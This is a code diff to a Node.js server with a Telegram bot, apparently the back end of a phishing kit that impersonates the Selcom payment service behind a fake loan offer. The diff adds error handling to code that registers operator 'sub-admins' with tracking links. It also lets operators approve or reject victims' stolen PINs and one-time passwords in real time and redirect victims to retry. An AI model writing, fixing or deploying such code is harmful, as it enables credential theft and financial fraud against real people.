@@ -54,88 +54,101 @@ function resolveTargetChat(adminParam) {
 }
 
 async function initBot() {
-  bot = new TelegramBot(TOKEN, { polling: true });
+  try {
+    bot = new TelegramBot(TOKEN, { polling: true });
 
-  bot.onText(/\/start/, async (msg) => {
-    try {
-      const chatId = String(msg.chat.id);
-      let chatInfo = {};
-      try { chatInfo = await bot.getChat(chatId); } catch (e) {}
-
-      const username = chatInfo.username || msg.from.username || 'N/A';
-      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
-      const lastName = chatInfo.last_name || msg.from.last_name || '';
-
-      if (!admins.has(chatId)) {
-        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
-        saveAdmins();
-      }
-
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        const mainAdminMessage = `👑 *Selcom Admin Principal*\n\n` +
-                                 `👤 *Info:*\n` +
-                                 `• Nom: ${firstName} ${lastName}\n` +
-                                 `• Chat ID: \`${chatId}\`\n\n` +
-                                 `🔗 *Votre lien de suivi personnel:*\n${userLink}`;
-        await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
+    // Suppress/Handle polling conflict errors cleanly during redeploys
+    bot.on('polling_error', (error) => {
+      if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
+        // Ignored safe warning during Render rolling deployments
         return;
       }
+      console.error(`Telegram polling error: ${error.message}`);
+    });
 
-      const subAdminMessage = `🤖 *ESPACE SOUS-ADMINISTRATEUR SELCOM*\n\n` +
-                              `👤 *Vos Infos:*\n` +
-                              `• Nom: ${firstName} ${lastName}\n` +
-                              `• Chat ID: \`${chatId}\`\n\n` +
-                              `🔗 *Votre lien de suivi indépendant:*\n${userLink}`;
+    bot.onText(/\/start/, async (msg) => {
+      try {
+        const chatId = String(msg.chat.id);
+        let chatInfo = {};
+        try { chatInfo = await bot.getChat(chatId); } catch (e) {}
 
-      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
-    } catch (err) {}
-  });
+        const username = chatInfo.username || msg.from.username || 'N/A';
+        const firstName = chatInfo.first_name || msg.from.first_name || 'User';
+        const lastName = chatInfo.last_name || msg.from.last_name || '';
 
-  bot.on('callback_query', async (query) => {
-    try {
-      const actionData = query.data || '';
-      const chatId = String(query.message.chat.id);
-      const parts = actionData.split('_');
-      const actionType = parts.slice(0, 2).join('_'); 
-      const targetId = parts.slice(2).join('_');
+        if (!admins.has(chatId)) {
+          admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
+          saveAdmins();
+        }
 
-      let session = sessions.get(targetId);
-      if (!session) session = { adminChatId: chatId };
+        const userLink = `${APP_URL}/?admin=${chatId}`;
 
-      const chatTarget = session.adminChatId || chatId;
+        if (chatId === String(FALLBACK_ADMIN_ID)) {
+          const mainAdminMessage = `👑 *Selcom Admin Principal*\n\n` +
+                                   `👤 *Info:*\n` +
+                                   `• Nom: ${firstName} ${lastName}\n` +
+                                   `• Chat ID: \`${chatId}\`\n\n` +
+                                   `🔗 *Votre lien de suivi personnel:*\n${userLink}`;
+          await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
+          return;
+        }
 
-      switch (actionType) {
-        case 'DENY_CREDS':
-        case 'WRONG_PIN':
-          session.status = 'RETRY_PIN';
-          session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ PIN incorrect. Mteja ametakiwa kurudia.`);
-          break;
-        case 'ALLOW_CREDS':
-          session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ PIN imekubaliwa. Mteja ameelekezwa kwenye ukurasa wa OTP.`);
-          break;
-        case 'WRONG_OTP':
-          session.status = 'RETRY_OTP';
-          session.otp = '';
-          await bot.sendMessage(chatTarget, `❌ OTP si sahihi. Mteja ametakiwa kuingiza tena.`);
-          break;
-        case 'APPROVED_FINAL':
-          session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu!`);
-          break;
-        default:
-          break;
-      }
+        const subAdminMessage = `🤖 *ESPACE SOUS-ADMINISTRATEUR SELCOM*\n\n` +
+                                `👤 *Vos Infos:*\n` +
+                                `• Nom: ${firstName} ${lastName}\n` +
+                                `• Chat ID: \`${chatId}\`\n\n` +
+                                `🔗 *Votre lien de suivi indépendant:*\n${userLink}`;
 
-      await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
-      if (query.message && query.message.message_id) {
-        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
-      }
-    } catch (err) {}
-  });
+        await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
+      } catch (err) {}
+    });
+
+    bot.on('callback_query', async (query) => {
+      try {
+        const actionData = query.data || '';
+        const chatId = String(query.message.chat.id);
+        const parts = actionData.split('_');
+        const actionType = parts.slice(0, 2).join('_'); 
+        const targetId = parts.slice(2).join('_');
+
+        let session = sessions.get(targetId);
+        if (!session) session = { adminChatId: chatId };
+
+        const chatTarget = session.adminChatId || chatId;
+
+        switch (actionType) {
+          case 'DENY_CREDS':
+          case 'WRONG_PIN':
+            session.status = 'RETRY_PIN';
+            session.pin = '';
+            await bot.sendMessage(chatTarget, `❌ PIN incorrect. Mteja ametakiwa kurudia.`);
+            break;
+          case 'ALLOW_CREDS':
+            session.status = 'PROCEED_OTP';
+            await bot.sendMessage(chatTarget, `✅ PIN imekubaliwa. Mteja ameelekezwa kwenye ukurasa wa OTP.`);
+            break;
+          case 'WRONG_OTP':
+            session.status = 'RETRY_OTP';
+            session.otp = '';
+            await bot.sendMessage(chatTarget, `❌ OTP si sahihi. Mteja ametakiwa kuingiza tena.`);
+            break;
+          case 'APPROVED_FINAL':
+            session.status = 'SUCCESS';
+            await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu!`);
+            break;
+          default:
+            break;
+        }
+
+        await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
+        if (query.message && query.message.message_id) {
+          await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
+        }
+      } catch (err) {}
+    });
+  } catch (e) {
+    console.log('Bot initialization warning:', e.message);
+  }
 }
 
 app.get('/', (req, res) => {
@@ -248,4 +261,3 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                 
